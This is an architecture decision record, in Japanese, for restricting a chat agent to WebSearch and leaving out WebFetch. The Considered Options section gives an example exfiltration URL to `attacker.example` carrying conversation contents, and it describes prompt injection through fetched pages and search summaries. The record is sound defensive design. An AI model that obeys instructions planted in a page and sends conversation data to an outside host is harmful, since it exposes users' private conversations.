---
status: accepted
---

# Chat の agent に WebSearch だけを持たせ、WebFetch は持たせない

Chat の agent は、ページと model の知識だけでは答えられない質問（ページが前提にする用語や人物、model の知識より新しい出来事）に答えられない。そこで ADR-0033 の `tools: []` に built-in の `WebSearch` だけを足す。`tools` と `allowedTools` の両方に `['WebSearch']` を渡す。`allowedTools` に入れないと、`permissionPrompts: "none"` で自動で拒否される。system prompt では、ページで足りないときだけ検索するよう伝える。

ADR-0033 が求める「足す理由」と「token の無いブラウザの口から起こしてよい理由」は次のとおり。

- WebSearch の検索は Anthropic の検索 backend が行い、claude は検索結果のリンクの一覧と、そのページの要約を受け取るだけになる。query の送り先は Anthropic の検索 backend に限られ、任意の host へ request は出さない。会話の中身を query に載せられても、届くのはその backend だけになる。
- WebSearch は shell・command・file・Monica の口に届かず、何も書かない。ADR-0017 の「shell や command に届く procedure を載せない」とぶつからない。
- 1 回の検索は plan の使用量（API の料金では 1,000 回あたり 10 USD と token 代）を使う。side panel の token を持つ者はもともと claude に答えさせられるので、検索で増えるのは 1 問あたりの使用量だけになる。

## Considered Options

- **WebFetch も持たせる**: ページの中身を読めるが、ページに仕込まれた指示で `https://attacker.example/?q=<会話の中身>` を取りに行かせられ、会話の中身が任意の host へ出る。`hooks.PreToolUse` で「同じ質問の WebSearch の結果に出た URL だけ許す」gate を組めることは実機で確かめた（別 host への redirect も WebFetch が追わず、gate で止まる）。検索の要約で足りない場面がはっきりするまで足さない。
- **質問ごとに検索を on にするボタンを置く**: 使用量と待ち時間は抑えられるが、ページの外の知識が要る質問は多く、毎回押すことになる。使うかどうかは model に任せ、system prompt で絞る。

## Consequences

- 検索結果の要約には検索で見つかったページの本文の事実が入るので、ページに仕込まれた指示は WebFetch を持たせなくても、検索の時点で model に届きうる。指示が届いた先でできるのは、答えの文字を変えることと、次の検索の query を変えることだけになる。
- WebSearch は Amazon Bedrock では使えない。ADR-0033 で認証と接続先を替える env を通さないので、Chat は plan の login の API で動き、当たらない。
- subscription の login で、検索が plan の使用量にどう数えられるかは docs に無く、確かめていない。
- Team と Enterprise の組織のポリシーで WebSearch が外されていれば、claude の tools に出ず、検索しないで答える。
- 調べた SDK の挙動は `docs/research/agent-sdk-model-effort-web-tools.md` にある。
